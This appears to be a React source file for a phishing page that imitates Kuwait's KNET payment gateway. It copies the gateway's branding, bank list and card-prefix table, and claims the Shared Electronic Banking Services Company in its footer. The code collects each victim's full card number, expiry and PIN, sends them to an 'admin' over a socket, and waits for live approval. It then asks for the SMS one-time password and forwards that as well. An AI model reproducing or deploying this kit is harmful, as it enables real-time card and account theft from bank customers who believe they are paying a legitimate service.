import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import WaitingOverlay from "@/components/WaitingOverlay";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";

// Bank-to-prefix mapping (exact from original KNET page)
const bankPrefixMap: Record<string, { prefixes: string[] }> = {
  "Al Ahli Bank of Kuwait [ABK]": {
    prefixes: ["403622", "423826", "428628"],
  },
  "Boubyan Bank [Boubyan]": {
    prefixes: ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
  },
  "Burgan Bank [Burgan]": {
    prefixes: ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
  },
  "Commercial Bank of Kuwait [CBK]": {
    prefixes: ["521175", "516334", "532672", "537015"],
  },
  "Gulf Bank of Kuwait [GBK]": {
    prefixes: ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
  },
  "KFH [TAM]": {
    prefixes: ["45077848", "45077849"],
  },
  "Kuwait Finance House [KFH]": {
    prefixes: ["450778", "485602", "537016", "532674"],
  },
  "Kuwait International Bank [KIB]": {
    prefixes: ["409054", "406464"],
  },
  "National Bank of Kuwait [NBK]": {
    prefixes: ["464452", "589160"],
  },
  "NBK [Weyay]": {
    prefixes: ["46445250", "543363"],
  },
  "Qatar National Bank [QNB]": {
    prefixes: ["521020", "524745"],
  },
  "Union National Bank [UNB]": {
    prefixes: ["457778"],
  },
  "Warba Bank [Warba]": {
    prefixes: ["532749", "559459", "541350", "525528"],
  },
};

const bankNames = Object.keys(bankPrefixMap);

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 44 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

// Phase: "card" = card entry, "otp" = OTP entry
type Phase = "card" | "otp";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");

  // Card form state
  const [selectedBank, setSelectedBank] = useState("");
  const [selectedPrefix, setSelectedPrefix] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardPin, setCardPin] = useState("");

  // OTP state
  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180); // 3 minutes
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Common state
  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");

  // Get amount from localStorage
  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";

  // Get prefixes for selected bank
  const availablePrefixes = selectedBank && bankPrefixMap[selectedBank]
    ? bankPrefixMap[selectedBank].prefixes
    : [];

  // Masked card for OTP phase
  const fullCard = selectedPrefix + cardNumber;
  const maskedCard = "******" + fullCard.slice(-4);

  useEffect(() => {
    navigateToPage("دفع كي نت");
  }, []);

  // Countdown timer for OTP
  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // When bank changes, reset prefix
  const handleBankChange = (bankName: string) => {
    setSelectedBank(bankName);
    setSelectedPrefix("");
    setCardNumber("");
    setValidationError("");
    setRejectedError("");
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card") {
        if (action === "otp") {
          // Admin approved card → show OTP section
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق كي نت (OTP)");
        } else if (action === "reject") {
          // Admin rejected card → show error, clear fields
          setRejectedError("يرجى التأكد من المعلومات المدخلة");
          setCardNumber("");
          setCardPin("");
          setSelectedPrefix("");
          setExpiryMonth("");
          setExpiryYear("");
          setSelectedBank("");
        }
      } else if (phase === "otp") {
        if (action === "otp") {
          // Admin approved OTP → go to final page
          navigate("/final-page");
        } else if (action === "reject") {
          // Admin rejected OTP → show error modal
          setShowErrorModal(true);
          setErrorModalMessage("تم إدخال رمز خطأ يرجى المحاولة مرة أخرى");
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  const validateCardForm = (): boolean => {
    if (!selectedBank) {
      setValidationError("الرجاء اختيار البنك");
      return false;
    }
    if (!selectedPrefix) {
      setValidationError("الرجاء اختيار البادئة");
      return false;
    }
    const fullCardNumber = selectedPrefix + cardNumber;
    if (!cardNumber || cardNumber.length < 6) {
      setValidationError("خطأ : الرجاء التأكد من رقم البطاقة");
      return false;
    }
    if (cardPin.length !== 4 || !/^\d{4}$/.test(cardPin)) {
      setValidationError("خطأ : الرجاء أدخال الرقم السري المكون من اربع ارقام");
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError("خطأ : الرجاء أختيار شهر وسنة أنتهاء البطاقة");
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateCardForm()) return;

    setIsWaiting(true);
    setRejectedError("");

    const fullCardNumber = selectedPrefix + cardNumber;

    // Save to localStorage
    localStorage.setItem("cardNumber", fullCardNumber);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "knet",
      cardLast4: fullCardNumber.slice(-4),
      serviceName: mohData.serviceType || "الضمان الصحي",
      bankName: selectedBank,
      bankLogo: "/kpay/knet.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    // Send card data to admin
    sendData({
      paymentCard: {
        cardNumber: fullCardNumber,
        nameOnCard: "KNET",
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: "N/A",
        pin: cardPin,
        bankName: selectedBank,
        paymentMethod: "KNET",
      },
      current: "دفع كي نت",
      nextPage: "رمز التحقق كي نت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage("أدخل كود تحقق صحيح مكوّن من 4 إلى 6 أرقام");
      return;
    }

    setIsWaiting(true);

    // Send OTP to admin
    sendData({
      digitCode: otpCode,
      current: "رمز التحقق كي نت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  // Label style
  const labelStyle: React.CSSProperties = {
    float: "left",
    width: "40%",
    fontSize: 11,
    color: "#0070cd",
    fontWeight: "bold",
    textShadow: "0 1px 2px rgba(0,0,0,0.2)",
    lineHeight: "20px",
  };

  const valueStyle: React.CSSProperties = {
    float: "left",
    width: "60%",
    fontSize: 11,
    color: "#444444",
    fontWeight: "normal",
  };

  const rowStyle: React.CSSProperties = {
    borderBottom: "1px solid #8f8f90",
    paddingBottom: 5,
    paddingTop: 5,
    overflow: "hidden",
  };

  const cardStyle: React.CSSProperties = {
    backgroundColor: "#ffffff",
    padding: 20,
    border: "2px solid #8f8f90",
    borderRadius: 15,
    marginBottom: 15,
    boxShadow: "0 0 6px rgba(0,0,0,0.3)",
  };

  return (
    <div
      style={{
        margin: 0,
        padding: 0,
        boxSizing: "border-box",
        fontFamily: "Verdana, Arial, Helvetica, sans-serif",
        backgroundColor: "#ebebeb",
        minHeight: "100vh",
        position: "relative",
      }}
    >
      {/* Gray overlay for waiting state - page stays visible behind it */}
      {isWaiting && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "flex-start",
            justifyContent: "center",
          }}
        >
          <div style={{ marginTop: "50%", textAlign: "center" }}>
            <img src="/kpay/loading.gif" style={{ height: 20 }} alt="loading" />
          </div>
        </div>
      )}

      {/* Error Modal for rejected card info */}
      {rejectedError && phase === "card" && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <div
            style={{
              backgroundColor: "#ffffff",
              border: "1px solid rgba(0, 0, 0, 0.2)",
              borderRadius: 6,
              boxShadow: "0 3px 9px rgba(0, 0, 0, 0.5)",
              maxWidth: 400,
              width: "90%",
            }}
          >
            <div style={{ padding: 15, borderBottom: "1px solid #e5e5e5" }}></div>
            <div style={{ padding: 15, direction: "rtl", textAlign: "center" }}>
              <h4>{rejectedError}</h4>
            </div>
            <div style={{ padding: 15, textAlign: "center", borderTop: "1px solid #e5e5e5" }}>
              <button
                onClick={() => setRejectedError("")}
                style={{
                  backgroundColor: "#eaeaea",
                  border: "1px solid #cacaca",
                  padding: "5px 20px",
                  fontWeight: "bold",
                  color: "#666666",
                  height: 27,
                  borderRadius: 4,
                  cursor: "pointer",
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Error Modal for OTP rejection */}
      {showErrorModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100%",
            height: "100%",
            backgroundColor: "rgba(108, 117, 125, 0.41)",
            zIndex: 1000000000,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
          }}
        >
          <div
            style={{
              backgroundColor: "#ffffff",
              border: "1px solid rgba(0, 0, 0, 0.2)",
              borderRadius: 6,
              boxShadow: "0 3px 9px rgba(0, 0, 0, 0.5)",
              maxWidth: 400,
              width: "90%",
            }}
          >
            <div
              style={{
                padding: 15,
                borderBottom: "1px solid #e5e5e5",
                display: "flex",
                justifyContent: "flex-end",
              }}
            >
              <button
                onClick={() => setShowErrorModal(false)}
                style={{
                  background: "transparent",
                  border: 0,
                  fontSize: 21,
                  fontWeight: "bold",
                  cursor: "pointer",
                  opacity: 0.5,
                }}
              >
                &times;
              </button>
            </div>
            <div style={{ padding: 15, direction: "rtl", textAlign: "center" }}>
              <h4>{errorModalMessage}</h4>
            </div>
            <div style={{ padding: 15, textAlign: "center", borderTop: "1px solid #e5e5e5" }}>
              <button
                onClick={() => setShowErrorModal(false)}
                style={{
                  backgroundColor: "#eaeaea",
                  border: "1px solid #cacaca",
                  padding: "5px 20px",
                  fontWeight: "bold",
                  color: "#666666",
                  height: 27,
                  borderRadius: 4,
                  cursor: "pointer",
                }}
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Banner */}
      <div>
        <img src="/assets/mob.jpg" alt="KNET" style={{ width: "100%" }} />
      </div>

      <div style={{ width: "100%", padding: 15, boxSizing: "border-box" }}>
        <div style={{ width: "100%", maxWidth: 395, margin: "0 auto" }}>

          {/* ============ PHASE: CARD ============ */}
          {phase === "card" && (
            <form onSubmit={handleCardSubmit}>
              {/* Merchant Info Card */}
              <div style={{ ...cardStyle, marginTop: 25 }}>
                <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
                  <img src="/assets/nbk.png" alt="NBK" style={{ width: 150 }} />
                </div>
                <div style={rowStyle}>
                  <label style={labelStyle}>:Merchant</label>
                  <label style={valueStyle}>AHIS</label>
                </div>
                <div style={{ overflow: "hidden", paddingTop: 5 }}>
                  <label style={labelStyle}>:Amount</label>
                  <label style={valueStyle}>KD {totalAmount}</label>
                </div>
              </div>

              {/* Card Form */}
              <div style={cardStyle}>
                {/* Validation Error */}
                {validationError && (
                  <div
                    style={{
                      border: "#ff0000 1px solid",
                      backgroundColor: "#f7dadd",
                      fontSize: 12,
                      fontFamily: "helvetica, arial, sans serif",
                      color: "#ff0000",
                      padding: 10,
                      textAlign: "center",
                      marginBottom: 10,
                      borderRadius: 4,
                    }}
                  >
                    {validationError}
                  </div>
                )}

                {/* Bank Name */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:Bank Name</label>
                  <select
                    value={selectedBank}
                    onChange={(e) => handleBankChange(e.target.value)}
                    style={{ width: "60%", fontSize: 11, height: 20, color: "#444444" }}
                  >
                    <option value="">Select Your Bank</option>
                    {bankNames.map((name) => (
                      <option key={name} value={name}>{name}</option>
                    ))}
                  </select>
                </div>

                {/* Card Number */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:Card Number</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    maxLength={10}
                    value={cardNumber}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      setCardNumber(val);
                      setValidationError("");
                    }}
                    style={{
                      width: "32%",
                      border: "2px solid #0070cd",
                      boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                      padding: "0 3px",
                      outline: 0,
                      fontSize: 11,
                      height: 20,
                    }}
                  />
                  <select
                    value={selectedPrefix}
                    onChange={(e) => setSelectedPrefix(e.target.value)}
                    style={{ width: "26%", fontSize: 11, height: 20, color: "#444444", marginLeft: 3 }}
                  >
                    <option value="">Prefix</option>
                    {availablePrefixes.map((p) => (
                      <option key={p} value={p}>{p}</option>
                    ))}
                  </select>
                </div>

                {/* Expiration Date */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:Expiration Date</label>
                  <select
                    value={expiryMonth}
                    onChange={(e) => setExpiryMonth(e.target.value)}
                    style={{ width: "18%", fontSize: 11, height: 20, color: "#444444", marginRight: 5 }}
                  >
                    <option value="">MM</option>
                    {months.map((m) => (
                      <option key={m.value} value={m.value}>{m.label}</option>
                    ))}
                  </select>
                  <select
                    value={expiryYear}
                    onChange={(e) => setExpiryYear(e.target.value)}
                    style={{ width: "39%", fontSize: 11, height: 20, color: "#444444", float: "right" }}
                  >
                    <option value="">YYYY</option>
                    {years.map((y) => (
                      <option key={y.value} value={y.value}>{y.label}</option>
                    ))}
                  </select>
                </div>

                {/* PIN */}
                <div style={{ ...rowStyle, borderBottom: "none" }}>
                  <label style={labelStyle}>:PIN</label>
                  <input
                    type="password"
                    inputMode="numeric"
                    maxLength={4}
                    value={cardPin}
                    onChange={(e) => {
                      const val = e.target.value.replace(/\D/g, "");
                      setCardPin(val);
                      setValidationError("");
                    }}
                    style={{
                      width: "60%",
                      border: "2px solid #0070cd",
                      boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                      padding: "0 3px",
                      outline: 0,
                      fontSize: 11,
                      height: 20,
                    }}
                  />
                </div>
              </div>

              {/* Submit / Cancel */}
              <div style={{ ...cardStyle, textAlign: "center" }}>
                <button
                  type="submit"
                  style={{
                    backgroundColor: "#eaeaea",
                    border: "1px solid #cacaca",
                    padding: "5px 0",
                    fontWeight: "bold",
                    color: "#666666",
                    width: "50%",
                    height: 27,
                    borderRadius: 4,
                    cursor: "pointer",
                    float: "left",
                  }}
                >
                  Submit
                </button>
                <button
                  type="button"
                  onClick={() => window.history.back()}
                  style={{
                    backgroundColor: "#eaeaea",
                    border: "1px solid #cacaca",
                    padding: "5px 0",
                    fontWeight: "bold",
                    color: "#666666",
                    width: "50%",
                    height: 27,
                    borderRadius: 4,
                    cursor: "pointer",
                    WebkitAppearance: "none",
                  }}
                >
                  Cancel
                </button>
              </div>
            </form>
          )}

          {/* ============ PHASE: OTP ============ */}
          {phase === "otp" && (
            <>
              {/* Merchant Info Card with KNET logo */}
              <div style={{ ...cardStyle, marginTop: 25 }}>
                <div style={{ textAlign: "center", marginTop: -5, marginBottom: 15 }}>
                  <img src="/kpay/knet.png" alt="KNET" style={{ width: 60 }} />
                </div>
                <div style={rowStyle}>
                  <label style={labelStyle}>:Merchant</label>
                  <label style={valueStyle}>AHIS</label>
                </div>
                <div style={{ overflow: "hidden", paddingTop: 5 }}>
                  <label style={labelStyle}>:Amount</label>
                  <label style={valueStyle}>KD {totalAmount}</label>
                </div>
              </div>

              {/* OTP Form Card */}
              <div style={cardStyle}>
                {/* Notification */}
                <div
                  style={{
                    color: "#31708f",
                    fontFamily: "Arial, Helvetica, serif",
                    fontSize: 13,
                    backgroundColor: "#d9edf6",
                    padding: 10,
                    border: "1px solid #bacce0",
                    borderRadius: 4,
                    marginBottom: 10,
                    textAlign: "justify",
                  }}
                >
                  <p style={{ margin: 0 }}>
                    <span style={{ fontWeight: "bold" }}>NOTIFICATION:</span> You
                    will presently receive an SMS on your mobile number registered
                    with your bank. This is an OTP (One Time Password) SMS, it
                    contains 6 digits to be entered in the box below.
                  </p>
                </div>

                {/* Card Number */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:Card Number</label>
                  <label style={valueStyle}>{maskedCard}</label>
                </div>

                {/* Expiration Month */}
                <div style={rowStyle}>
                  <label style={{ ...labelStyle, width: "45%" }}>:Expiration Month</label>
                  <label style={{ ...valueStyle, width: "55%" }}>{expiryMonth.padStart(2, "0")}</label>
                </div>

                {/* Expiration Year */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:Expiration Year</label>
                  <label style={valueStyle}>{expiryYear}</label>
                </div>

                {/* PIN */}
                <div style={rowStyle}>
                  <label style={labelStyle}>:PIN</label>
                  <label style={valueStyle}>****</label>
                </div>

                {/* OTP with countdown */}
                <div style={{ ...rowStyle, borderBottom: "none" }}>
                  <label style={{ ...labelStyle, paddingTop: 4 }}>:OTP</label>
                  <div style={{ float: "left", width: "60%", position: "relative" }}>
                    <input
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={otpCode}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "");
                        setOtpCode(val);
                      }}
                      placeholder={formatCountdown(countdown)}
                      style={{
                        width: "100%",
                        border: "2px solid #0070cd",
                        boxShadow: "inset 0 0 5px rgba(0,0,0,0.3)",
                        padding: "0 3px",
                        outline: 0,
                        fontSize: 11,
                        height: 20,
                      }}
                    />
                  </div>
                </div>
              </div>

              {/* Submit / Cancel */}
              <div style={{ ...cardStyle, textAlign: "center", overflow: "hidden" }}>
                <button
                  type="button"
                  onClick={handleOtpSubmit}
                  disabled={!otpCode || otpCode.length < 4}
                  style={{
                    backgroundColor: "#eaeaea",
                    border: "1px solid #cacaca",
                    padding: "5px 0",
                    fontWeight: "bold",
                    color: "#666666",
                    width: "50%",
                    height: 27,
                    borderRadius: 4,
                    cursor: otpCode && otpCode.length >= 4 ? "pointer" : "not-allowed",
                    float: "left",
                    opacity: otpCode && otpCode.length >= 4 ? 1 : 0.6,
                  }}
                >
                  Submit
                </button>
                <button
                  type="button"
                  onClick={() => window.history.back()}
                  style={{
                    backgroundColor: "#eaeaea",
                    border: "1px solid #cacaca",
                    padding: "5px 0",
                    fontWeight: "bold",
                    color: "#666666",
                    width: "50%",
                    height: 27,
                    borderRadius: 4,
                    cursor: "pointer",
                    WebkitAppearance: "none",
                  }}
                >
                  Cancel
                </button>
              </div>
            </>
          )}

          {/* Footer */}
          <footer style={{ textAlign: "center", marginTop: 15 }}>
            <div
              style={{
                textAlign: "center",
                fontSize: 11,
                lineHeight: "18px",
              }}
            >
              All Rights Reserved. Copyright 2024
              <br />
              <span
                style={{
                  fontSize: 10,
                  fontWeight: "bold",
                  color: "#0077d5",
                }}
              >
                The Shared Electronic Banking Services Company - KNET
              </span>
            </div>
          </footer>
        </div>
      </div>
    </div>
  );
}
